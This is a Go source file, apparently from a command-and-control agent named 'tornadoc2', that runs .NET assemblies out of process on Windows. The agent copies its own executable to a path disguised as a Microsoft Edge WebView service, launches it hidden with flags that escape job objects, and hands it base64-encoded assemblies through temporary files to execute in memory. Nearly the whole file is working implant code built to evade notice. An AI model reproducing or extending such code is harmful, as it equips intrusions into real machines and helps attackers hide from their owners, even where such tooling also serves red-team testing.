//go:build windows

package platform

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"tornadoc2/agent/native"
)

const (
	envWorker   = "TORNADO_WORKER"
	envAsmPath  = "TORNADO_ASM_PATH"
	envArgs     = "TORNADO_ASM_ARGS"
	envOutPath  = "TORNADO_OUT_PATH"
	envCodePath = "TORNADO_CODE_PATH"
)

func IsWorkerMode() bool {
	return os.Getenv(envWorker) == "1"
}

func RunWorker() {
	asmPath := os.Getenv(envAsmPath)
	argsString := os.Getenv(envArgs)
	outPath := os.Getenv(envOutPath)
	codePath := os.Getenv(envCodePath)

	defer func() {
		if r := recover(); r != nil {
			_ = os.WriteFile(codePath,
				[]byte(fmt.Sprintf("-1|panic: %v\n", r)), 0600)
		}
	}()

	asmB64, err := os.ReadFile(asmPath)
	if err != nil {
		_ = os.WriteFile(codePath,
			[]byte("-1|read asm: "+err.Error()), 0600)
		os.Exit(2)
	}
	asmBytes, err := base64.StdEncoding.DecodeString(
		strings.TrimSpace(string(asmB64)))
	if err != nil {
		_ = os.WriteFile(codePath,
			[]byte("-1|b64 decode: "+err.Error()), 0600)
		os.Exit(2)
	}

	out, code, err := native.ExecuteDotNetAssemblyInProcess(
		asmBytes, "", "", argsString)
	if err != nil {
		_ = os.WriteFile(outPath, []byte(out), 0600)
		_ = os.WriteFile(codePath,
			[]byte(fmt.Sprintf("-1|%v", err)), 0600)
		os.Exit(3)
	}

	_ = os.WriteFile(outPath, []byte(out), 0600)
	_ = os.WriteFile(codePath,
		[]byte(fmt.Sprintf("%d|ok", code)), 0600)
	os.Exit(0)
}

const defaultWorkerPath = `%LOCALAPPDATA%\Microsoft\EdgeWebView\svc.exe`

func resolveWorkerBinary(spawnTo string) (string, error) {
	switch spawnTo {
	case "":
	default:
		if _, err := os.Stat(spawnTo); err != nil {
			return "", fmt.Errorf(
				"spawnto %q does not exist on the target: %w",
				spawnTo, err)
		}
		return spawnTo, nil
	}

	path := os.ExpandEnv(defaultWorkerPath)
	if path == defaultWorkerPath {
		if base := os.Getenv("USERPROFILE"); base != "" {
			path = filepath.Join(base,
				"AppData", "Local",
				"Microsoft", "EdgeWebView", "svc.exe")
		} else {
			return "", fmt.Errorf(
				"cannot resolve default worker path: " +
					"neither LOCALAPPDATA nor USERPROFILE " +
					"is set in the worker environment")
		}
	}

	if _, err := os.Stat(path); err == nil {
		return path, nil
	}

	if err := stageSelfAt(path); err != nil {
		return "", fmt.Errorf(
			"stage default worker at %q: %w", path, err)
	}
	return path, nil
}

func stageSelfAt(dst string) error {
	if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
		return err
	}

	self, err := os.Executable()
	if err != nil {
		return fmt.Errorf("locate self: %w", err)
	}

	in, err := os.Open(self)
	if err != nil {
		return fmt.Errorf("open self: %w", err)
	}
	defer in.Close()

	out, err := os.OpenFile(dst,
		os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0700)
	if err != nil {
		return fmt.Errorf("create worker: %w", err)
	}

	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		os.Remove(dst)
		return fmt.Errorf("copy self: %w", err)
	}
	if err := out.Close(); err != nil {
		os.Remove(dst)
		return fmt.Errorf("close worker: %w", err)
	}
	return nil
}

func ExecAssemblyOutOfProcess(
	ctx context.Context,
	asmBytes []byte,
	argsString string,
	spawnTo string,
) (string, int, error) {

	tmpDir, err := os.MkdirTemp("", "t2asm")
	if err != nil {
		return "", -1, fmt.Errorf("worker tmpdir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	asmPath  := filepath.Join(tmpDir, "a.b64")
	outPath  := filepath.Join(tmpDir, "o.txt")
	codePath := filepath.Join(tmpDir, "c.txt")

	if err := os.WriteFile(asmPath,
		[]byte(base64.StdEncoding.EncodeToString(asmBytes)),
		0600); err != nil {
		return "", -1, fmt.Errorf("worker asm file: %w", err)
	}

	target, err := resolveWorkerBinary(spawnTo)
	if err != nil {
		return "", -1, err
	}

	cmd := exec.CommandContext(ctx, target)
	cmd.Env = append(os.Environ(),
		envWorker+"=1",
		envAsmPath+"="+asmPath,
		envArgs+"="+argsString,
		envOutPath+"="+outPath,
		envCodePath+"="+codePath,
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
		// CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB |
		// CREATE_NEW_PROCESS_GROUP: no console, no job-object
		// inheritance, no shared Ctrl+C.
		CreationFlags: 0x08000000 | 0x01000000 | 0x00000200,
	}

	if err := cmd.Start(); err != nil {
		return "", -1, fmt.Errorf("worker spawn: %w", err)
	}

	waitDone := make(chan error, 1)
	go func() { waitDone <- cmd.Wait() }()

	select {
	case <-ctx.Done():
		_ = cmd.Process.Kill()
		<-waitDone
		return "", -1, ctx.Err()
	case <-waitDone:
	}

	outBytes, _ := os.ReadFile(outPath)
	codeBytes, _ := os.ReadFile(codePath)

	exitCode := 0
	if len(codeBytes) > 0 {
		// Format is "<n>|ok" or "<n>|<error text>".
		s := strings.TrimSpace(string(codeBytes))
		if i := strings.IndexByte(s, '|'); i >= 0 {
			if n, perr := strconv.Atoi(s[:i]); perr == nil {
				exitCode = n
			}
		}
	}

	return string(outBytes), exitCode, nil
}